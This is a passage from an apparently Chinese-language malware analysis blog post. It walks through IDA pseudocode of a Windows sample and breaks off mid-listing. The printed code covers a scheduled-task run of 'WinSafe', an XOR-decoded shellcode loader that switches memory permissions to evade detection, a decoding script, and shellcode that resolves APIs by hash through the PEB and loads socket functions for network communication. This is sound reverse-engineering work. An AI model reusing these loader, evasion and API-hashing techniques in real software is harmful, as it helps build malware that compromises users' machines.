class="string">&#x27;\\&#x27;</span> )            <span class="comment">// 判断路径斜杠并更新 v3</span></span><br><span class="line">                                                <span class="comment">// 大概率是截取路径的最后一块</span></span><br><span class="line">      &#123;</span><br><span class="line">        v3 = i;</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( !*(i - <span class="number">1</span>) )                     <span class="comment">// 匹配到字符串末尾</span></span><br><span class="line">      &#123;</span><br><span class="line">        v7 = *v3;</span><br><span class="line">        <span class="keyword">if</span> ( *v3 )</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="keyword">for</span> ( j = v3 + <span class="number">3</span>; ; ++j )             <span class="comment">// 对路径进行处理（判断是否被重命名？）</span></span><br><span class="line">          &#123;</span><br><span class="line">            v9 = v7 &amp; <span class="number">0xDF</span> ^ <span class="number">0x49</span>;</span><br><span class="line">            v7 = *(j - <span class="number">2</span>);</span><br><span class="line">            <span class="keyword">if</span> ( !(v9 | v7 &amp; <span class="number">0xDF</span> ^ <span class="number">0x4E</span>) &amp;&amp; (*(j - <span class="number">1</span>) &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;D&#x27;</span> &amp;&amp; (*j &amp; <span class="number">0xDF</span>) == <span class="string">&#x27;O&#x27;</span> )</span><br><span class="line">              <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">if</span> ( !v7 )</span><br><span class="line">              <span class="keyword">return</span> v4;</span><br><span class="line">          &#125;</span><br><span class="line">          <span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> v4;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-400593-——计划任务执行"><a href="#sub-400593-——计划任务执行" class="headerlink" title="sub_400593()——计划任务执行"></a><code>sub_400593()</code>——计划任务执行</h3><p>这里伪代码，一开始都识别为 <code>MEMORY[0]</code>，没分析出来。<br>后面重新划分了一下前面 <code>sub_4002f5()</code> 的变量，可以正常得到函数调用结果。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_400593</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> ProcessA_4009DC; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v2[<span class="number">4</span>]; <span class="comment">// [esp+28h] [ebp-98h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v3[<span class="number">50</span>]; <span class="comment">// [esp+3Ah] [ebp-86h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v4[<span class="number">12</span>]; <span class="comment">// [esp+6Ch] [ebp-54h] BYREF</span></span><br><span class="line">  __int16 v5; <span class="comment">// [esp+9Ch] [ebp-24h]</span></span><br><span class="line"></span><br><span class="line">  xor_6ah_400488(v3, &amp;word_400A6E);             <span class="comment">// schtasks /run /tn WinSafe</span></span><br><span class="line">  sub_400783((<span class="type">int</span>)v4, <span class="number">0</span>, <span class="number">68</span>);                   <span class="comment">// memset？</span></span><br><span class="line">  sub_400783((<span class="type">int</span>)v2, <span class="number">0</span>, <span class="number">16</span>);                   <span class="comment">// 设置 PROCESS_INFORMATION？</span></span><br><span class="line">  v4[<span class="number">0</span>] = <span class="number">68</span>;                                   <span class="comment">// 设置 startupinfo？</span></span><br><span class="line">  v4[<span class="number">11</span>] = <span class="number">1</span>;</span><br><span class="line">  v5 = <span class="number">0</span>;</span><br><span class="line">  ProcessA_4009DC = pFnCreateProcessA_4009DC(<span class="number">0</span>, v3, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0x8000000</span>, <span class="number">0</span>, <span class="number">0</span>, v4, v2);<span class="comment">// CreateProcessA</span></span><br><span class="line">                                                <span class="comment">// 尝试运行 / 创建计划任务</span></span><br><span class="line">  <span class="keyword">if</span> ( ProcessA_4009DC )                        <span class="comment">// 成功创建进程</span></span><br><span class="line">  &#123;</span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">int</span>))pFnCloseHandle)(v2[<span class="number">0</span>]);<span class="comment">// CloseHandle hProcess</span></span><br><span class="line">    ((<span class="type">void</span> (__stdcall *)(<span class="type">int</span>))pFnCloseHandle)(v2[<span class="number">1</span>]);<span class="comment">// CloseHandle hThread</span></span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> ProcessA_4009DC;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="sub-400660-——执行-shellcode"><a href="#sub-400660-——执行-shellcode" class="headerlink" title="sub_400660()——执行 shellcode"></a><code>sub_400660()</code>——执行 shellcode</h3><p>开辟了新的内存空间，把 shellcode 写入然后解码。<br>然后调用 <code>VirtualProtect()</code> 先把原来的 <code>RWX</code> 权限改为 <code>R-X</code>，然后再执行的，估计也是为了避免动态监测到权限全开的内存段。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __usercall sub_400660@&lt;eax&gt;(<span class="type">int</span> a1@&lt;eax&gt;)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> space; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> (*v2)(<span class="type">void</span>); <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">int</span> v5; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// [esp-4h] [ebp-Ch] BYREF</span></span><br><span class="line"></span><br><span class="line">  v7 = a1;</span><br><span class="line">  space = ((<span class="type">int</span> (__stdcall *)(_DWORD, <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span>))pFnVirtualAlloc)(<span class="number">0</span>, <span class="number">0x98B</span>, <span class="number">0x3000</span>, <span class="number">4</span>);<span class="comment">// VirtualAlloc(NULL, 0x98B, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)</span></span><br><span class="line">  <span class="keyword">if</span> ( !space )</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">  v2 = (<span class="type">void</span> (*)(<span class="type">void</span>))space;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i != <span class="number">0x98B</span>; ++i )                <span class="comment">// 复制</span></span><br><span class="line">    *((_BYTE *)v2 + i) = byte_400AA0[i];</span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j != <span class="number">0x98B</span>; ++j )</span><br><span class="line">    *((_BYTE *)v2 + j) = (*((_BYTE *)v2 + j) + <span class="number">0x77</span>) ^ <span class="number">0x62</span>;<span class="comment">// 解码</span></span><br><span class="line">  <span class="keyword">if</span> ( ((<span class="type">int</span> (__stdcall *)(<span class="type">void</span> (*)(<span class="type">void</span>), <span class="type">int</span>, <span class="type">int</span>, <span class="type">int</span> *))pFnVirtualProtect)(v2, <span class="number">0x98B</span>, <span class="number">0x20</span>, &amp;v7) )<span class="comment">// 修改内存空间为 PAGE_EXECUTE_READ</span></span><br><span class="line">  &#123;</span><br><span class="line">    v2();                                       <span class="comment">// 执行 shellcode</span></span><br><span class="line">    v5 = <span class="number">1</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v5 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  pFnVirtualFree(v2, <span class="number">0</span>, <span class="number">0x8000</span>);</span><br><span class="line">  <span class="keyword">return</span> v5;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="shellcode-解码"><a href="#shellcode-解码" class="headerlink" title="shellcode 解码"></a>shellcode 解码</h3><h4 id="解密脚本"><a href="#解密脚本" class="headerlink" title="解密脚本"></a>解密脚本</h4><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> LEN 0x98B</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">(<span class="type">void</span>)</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">unsigned</span>  <span class="type">char</span> * buf = <span class="built_in">malloc</span>(<span class="number">0x990</span>);</span><br><span class="line">	FILE * fp = fopen(<span class="string">&quot;./shellcodes&quot;</span>, <span class="string">&quot;rb&quot;</span>), *fp_write;</span><br><span class="line">	fread(buf, <span class="number">1</span>, LEN, fp);</span><br><span class="line">	fclose(fp);</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i != LEN; ++i)</span><br><span class="line">	&#123;</span><br><span class="line">		buf[i] = (buf[i] + <span class="number">0x77</span>) ^ <span class="number">0x62</span>;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;%#x &quot;</span>, buf[i]);</span><br><span class="line">	&#125;</span><br><span class="line">	fp_write = fopen(<span class="string">&quot;./decoded&quot;</span>, <span class="string">&quot;wb&quot;</span>);</span><br><span class="line">	fwrite(buf, <span class="number">1</span>, LEN, fp_write);</span><br><span class="line">	fclose(fp_write);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="sub-0"><a href="#sub-0" class="headerlink" title="sub_0()"></a><code>sub_0()</code></h4><p>ida 稍作函数编辑（汇编代码 <code>ALT + P</code>）即可分析出伪代码。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">sub_0</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> **i; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> __int16 *v1; <span class="comment">// edx</span></span><br><span class="line">  <span class="type">int</span> v2; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> j; <span class="comment">// edi</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v4; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> hKernel32; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> hNtdll; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">int</span> v7; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v8; <span class="comment">// ecx</span></span><br><span class="line">  <span class="type">int</span> v9; <span class="comment">// esi</span></span><br><span class="line">  <span class="type">char</span> v11[<span class="number">8</span>]; <span class="comment">// [esp+44h] [ebp-214h] BYREF</span></span><br><span class="line">  <span class="type">char</span> v12[<span class="number">12</span>]; <span class="comment">// [esp+4Ch] [ebp-20Ch] BYREF</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnGetProcAddress)(<span class="type">int</span>, _BYTE *); <span class="comment">// [esp+58h] [ebp-200h]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnLoadLibraryA)(<span class="type">char</span> *); <span class="comment">// [esp+5Ch] [ebp-1FCh]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *pFnVirtualAlloc)(_DWORD, _DWORD, <span class="type">int</span>, <span class="type">int</span>); <span class="comment">// [esp+60h] [ebp-1F8h]</span></span><br><span class="line">  <span class="type">int</span> pFnVirtualFree; <span class="comment">// [esp+64h] [ebp-1F4h]</span></span><br><span class="line">  <span class="type">int</span> pFnlstrcmpiA; <span class="comment">// [esp+68h] [ebp-1F0h]</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *pFnRtlZeromemory)(<span class="type">int</span>, _DWORD); <span class="comment">// [esp+6Ch] [ebp-1ECh]</span></span><br><span class="line">  <span class="type">void</span> (__stdcall *pFnRtlMoveMemory)(<span class="type">int</span>, <span class="type">int</span>, _DWORD); <span class="comment">// [esp+70h] [ebp-1E8h]</span></span><br><span class="line">  <span class="type">int</span> (__stdcall *v20)(<span class="type">int</span>, <span class="type">char</span> *); <span class="comment">// [esp+74h] [ebp-1E4h]</span></span><br><span class="line">  <span class="type">int</span> v21; <span class="comment">// [esp+78h] [ebp-1E0h]</span></span><br><span class="line">  <span class="type">int</span> v22; <span class="comment">// [esp+7Ch] [ebp-1DCh]</span></span><br><span class="line">  <span class="type">int</span> v23; <span class="comment">// [esp+80h] [ebp-1D8h]</span></span><br><span class="line">  <span class="type">int</span> v24; <span class="comment">// [esp+84h] [ebp-1D4h]</span></span><br><span class="line">  <span class="type">int</span> v25; <span class="comment">// [esp+88h] [ebp-1D0h]</span></span><br><span class="line">  <span class="type">int</span> v26; <span class="comment">// [esp+8Ch] [ebp-1CCh]</span></span><br><span class="line">  <span class="type">int</span> v27; <span class="comment">// [esp+90h] [ebp-1C8h]</span></span><br><span class="line">  <span class="type">int</span> v28; <span class="comment">// [esp+94h] [ebp-1C4h]</span></span><br><span class="line">  <span class="type">int</span> v29; <span class="comment">// [esp+98h] [ebp-1C0h]</span></span><br><span class="line">  <span class="type">int</span> v30; <span class="comment">// [esp+9Ch] [ebp-1BCh]</span></span><br><span class="line">  <span class="type">int</span> v31; <span class="comment">// [esp+B0h] [ebp-1A8h]</span></span><br><span class="line">  <span class="type">int</span> v32; <span class="comment">// [esp+B4h] [ebp-1A4h]</span></span><br><span class="line">  <span class="type">int</span> v33; <span class="comment">// [esp+B8h] [ebp-1A0h]</span></span><br><span class="line">  <span class="type">int</span> buf1; <span class="comment">// [esp+BCh] [ebp-19Ch]</span></span><br><span class="line">  <span class="type">int</span> buf2; <span class="comment">// [esp+C0h] [ebp-198h]</span></span><br><span class="line">  <span class="type">char</span> v36[<span class="number">400</span>]; <span class="comment">// [esp+C8h] [ebp-190h] BYREF</span></span><br><span class="line"></span><br><span class="line">  v30 = <span class="number">0</span>;</span><br><span class="line">  v31 = <span class="number">0</span>;</span><br><span class="line">  v32 = <span class="number">0</span>;</span><br><span class="line">  v33 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = *(<span class="type">int</span> ***)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">0xC</span>) + <span class="number">0x14</span>); ; i = (<span class="type">int</span> **)*i )<span class="comment">// 从 fs 寄存器提取 peb 地址（fs:[0x30]），</span></span><br><span class="line">                                                <span class="comment">// 然后跳转到 ldr 链，读取 InMemoryOrderModuleList 链</span></span><br><span class="line">                                                <span class="comment">// 此时 i = 结构体成员 InMemoryOrderLinks 链地址</span></span><br><span class="line">                                                <span class="comment">// 开始遍历</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !i )</span><br><span class="line">    &#123;</span><br><span class="line">      hKernel32 = <span class="number">0</span>;</span><br><span class="line">      <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">    &#125;</span><br><span class="line">    v1 = (<span class="type">unsigned</span> __int16 *)i[<span class="number">10</span>];             <span class="comment">// 0x8(InMemoryOrderModuleList 距离结构体起始位置)</span></span><br><span class="line">                                                <span class="comment">// +0x24(到 BaseDllName)</span></span><br><span class="line">                                                <span class="comment">// +0x4(到其中的 Buffer) BaseDllName-&gt;Buffer 地址</span></span><br><span class="line">                                                <span class="comment">// 于是这就是为什么偏移为 10（汇编显示 0x28）</span></span><br><span class="line">                                                <span class="comment">// https://www.vergiliusproject.com/kernels/x86/windows-10/22h2/_UNICODE_STRING</span></span><br><span class="line">    v2 = *((<span class="type">unsigned</span> __int16 *)i + <span class="number">18</span>) &gt;&gt; <span class="number">1</span>;    <span class="comment">// 除以 2？WCHAR？</span></span><br><span class="line">    <span class="keyword">for</span> ( j = <span class="number">0</span>; v2; --v2 )                     <span class="comment">// 计算哈希，匹配函数名</span></span><br><span class="line">    &#123;</span><br><span class="line">      v4 = *v1++;                               <span class="comment">// 每次读取一个 unicode</span></span><br><span class="line">      <span class="keyword">if</span> ( v4 &gt;= <span class="number">0x61</span> )</span><br><span class="line">        LOWORD(v4) = v4 - <span class="number">0x20</span>;</span><br><span class="line">      j = (<span class="type">unsigned</span> __int16)v4 + <span class="number">131</span> * j;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ( (j &amp; <span class="number">0x7FFFFFFF</span>) == <span class="number">0x1CCA9CE6</span> )</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  hKernel32 = (<span class="type">int</span>)i[<span class="number">4</span>];                        <span class="comment">// DllBase dll 模块地址</span></span><br><span class="line">LABEL_10:</span><br><span class="line">  pFnGetProcAddress = (<span class="type">int</span> (__stdcall *)(<span class="type">int</span>, _BYTE *))sub_747(hKernel32, <span class="number">0x1AB9B854</span>, <span class="number">0</span>);<span class="comment">// GetProcAddress</span></span><br><span class="line">  pFnLoadLibraryA = (<span class="type">int</span> (__stdcall *)(<span class="type">char</span> *))sub_747(hKernel32, <span class="number">0x7F201F78</span>, pFnGetProcAddress);<span class="comment">// LoadLibraryA</span></span><br><span class="line">  pFnVirtualAlloc = (<span class="type">int</span> (__stdcall *)(_DWORD, _DWORD, <span class="type">int</span>, <span class="type">int</span>))sub_747(hKernel32, <span class="number">0x5E893462</span>, pFnGetProcAddress);<span class="comment">// VirtualAlloc</span></span><br><span class="line">  pFnVirtualFree = sub_747(hKernel32, <span class="number">0x6488073</span>, pFnGetProcAddress);<span class="comment">// VirtualFree</span></span><br><span class="line">  pFnlstrcmpiA = sub_747(hKernel32, <span class="number">0x705CF2A5</span>, pFnGetProcAddress);<span class="comment">// lstrcmpiA</span></span><br><span class="line">  <span class="built_in">strcpy</span>(v11, <span class="string">&quot;ntdll&quot;</span>);</span><br><span class="line">  hNtdll = pFnLoadLibraryA(v11);                <span class="comment">// 加载 ntdll</span></span><br><span class="line">  pFnRtlZeromemory = (<span class="type">void</span> (__stdcall *)(<span class="type">int</span>, _DWORD))sub_747(hNtdll, <span class="number">0xDB579CB</span>, pFnGetProcAddress);<span class="comment">// RtlZeroMemory</span></span><br><span class="line">  pFnRtlMoveMemory = (<span class="type">void</span> (__stdcall *)(<span class="type">int</span>, <span class="type">int</span>, _DWORD))sub_747(hNtdll, <span class="number">0x1518E9C0</span>, pFnGetProcAddress);<span class="comment">// RtlMoveMemory</span></span><br><span class="line">  v7 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( *(_BYTE *)(v7 + <span class="number">276</span>) != <span class="string">&#x27;c&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">277</span>) != <span class="string">&#x27;o&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">278</span>) != <span class="string">&#x27;d&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">279</span>) != <span class="string">&#x27;e&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">280</span>) != <span class="string">&#x27;m&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">281</span>) != <span class="string">&#x27;a&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">282</span>) != <span class="string">&#x27;r&#x27;</span></span><br><span class="line">       || *(_BYTE *)(v7 + <span class="number">283</span>) != <span class="string">&#x27;k&#x27;</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( ++v7 &gt;= <span class="number">21000</span> )</span><br><span class="line">      <span class="keyword">goto</span> LABEL_23;</span><br><span class="line">  &#125;</span><br><span class="line">  v32 = v7 + <span class="number">276</span>;</span><br><span class="line">  buf1 = pFnVirtualAlloc(<span class="number">0</span>, *(_DWORD *)(v7 + <span class="number">308</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);<span class="comment">// MEM_COMMIT | MEM_RESERVE</span></span><br><span class="line">  pFnRtlZeromemory(buf1, *(_DWORD *)(v32 + <span class="number">32</span>));</span><br><span class="line">  pFnRtlMoveMemory(buf1, v32 + <span class="number">56</span>, *(_DWORD *)(v32 + <span class="number">32</span>));</span><br><span class="line">  buf2 = pFnVirtualAlloc(<span class="number">0</span>, *(_DWORD *)(v32 + <span class="number">44</span>), <span class="number">0x3000</span>, <span class="number">0x40</span>);<span class="comment">// PAGE_EXECUTE_READWRITE</span></span><br><span class="line">  pFnRtlZeromemory(buf2, *(_DWORD *)(v32 + <span class="number">44</span>));</span><br><span class="line">  pFnRtlMoveMemory(buf2, *(_DWORD *)(v32 + <span class="number">32</span>) + v32 + <span class="number">56</span>, *(_DWORD *)(v32 + <span class="number">44</span>));</span><br><span class="line">LABEL_23:</span><br><span class="line">  v8 = *(_DWORD *)(v32 + <span class="number">32</span>) + *(_DWORD *)(v32 + <span class="number">44</span>);</span><br><span class="line">  <span class="built_in">strcpy</span>(v12, <span class="string">&quot;Ws2_32.dll&quot;</span>);</span><br><span class="line">  v33 = v32 + <span class="number">2</span> * v8 + <span class="number">56</span>;</span><br><span class="line">  v9 = pFnLoadLibraryA(v12);                    <span class="comment">// ws2_32.dll</span></span><br><span class="line">  v20 = (<span class="type">int</span> (__stdcall *)(<span class="type">int</span>, <span class="type">char</span> *))sub_747(v9, <span class="number">0x33522634</span>, pFnGetProcAddress);<span class="comment">// WSAStartup</span></span><br><span class="line">  v21 = sub_747(v9, <span class="number">0x26402D9F</span>, pFnGetProcAddress);<span class="comment">// socket</span></span><br><span class="line">  v22 = sub_747(v9, <span class="number">0x41539501</span>, pFnGetProcAddress);<span class="comment">// getaddrinfo</span></span><br><span class="line">  v23 = sub_747(v9, <span class="number">0x785E7DD7</span>, pFnGetProcAddress);<span class="comment">// freeaddrinfo</span></span><br><span class="line">  v24 = sub_747(v9, <span class="number">0x313A84C8</span>, pFnGetProcAddress);<span class="comment">// htons</span></span><br><span class="line">  v25 = sub_747(v9, <span class="number">0x92B50DA</span>, pFnGetProcAddress);<span class="comment">// connect</span></span><br><span class="line">  v26 = sub_747(v9, <span class="number">0xF8387DC</span>, pFnGetProcAddress);<span class="comment">// send</span></span><br><span class="line">  v27 = sub_747(v9, <span class="number">0xF6134B2</span>, pFnGetProcAddress);<span class="comment">// recv</span></span><br><span class="line">  v28 = sub_747(v9, <span class="number">0x14AC161B</span>, pFnGetProcAddress);<span class="comment">// closesocket</span></span><br><span class="line">  v29 = sub_747(v9, <span class="number">0x4FF42CCF</span>, pFnGetProcAddress);<span class="comment">// WSACleanup</span></span><br><span class="line">  <span class="keyword">if</span> ( !v20(<span class="number">514</span>, v36) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v32 + <span class="number">40</span>) )</span><br><span class="line">        sub_33A(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_4DF(<span class="number">1</span>);</span><br><span class="line">      <span class="keyword">if</span> ( *(_BYTE *)(v32 + <span class="number">52</span>) )</span><br><span class="line">        sub_33A(<span class="number">2</span>);</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        sub_4DF(<span class="number">2</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="遍历-LDR-链获取-kernel32"><a href="#遍历-LDR-链获取-kernel32" class="headerlink" title="遍历 LDR 链获取 kernel32"></a>遍历 LDR 链获取 kernel32</h4><p>注意以下代码：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ( i = *(<span class="type">int</span> ***)(*(_DWORD *)(__readfsdword(<span class="number">0x30</span>u) + <span class="number">0xC</span>) + <span class="number">0x14</span>); ; i = (<span class="type">int</span> **)*i )<span class="comment">// 从 fs 寄存器提取 peb 地址（fs:[0x30]），</span></span><br><span class="line">                                              <span class="comment">// 然后跳转到 ldr 链，读取 InMemoryOrderModuleList 链</span></span><br><span class="line">                                              <span class="comment">// 此时 i = 结构体成员 InMemoryOrderLinks 链地址</span></span><br><span class="line">                                              <span class="comment">// 开始遍历</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> ( !i )</span><br><span class="line">  &#123;</span><br><span class="line">    hKernel32 = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_10;</span><br><span class="line">  &#125;</span><br><span class="line">  v1 = (<span class="type">unsigned</span> __int16 *)i[<span 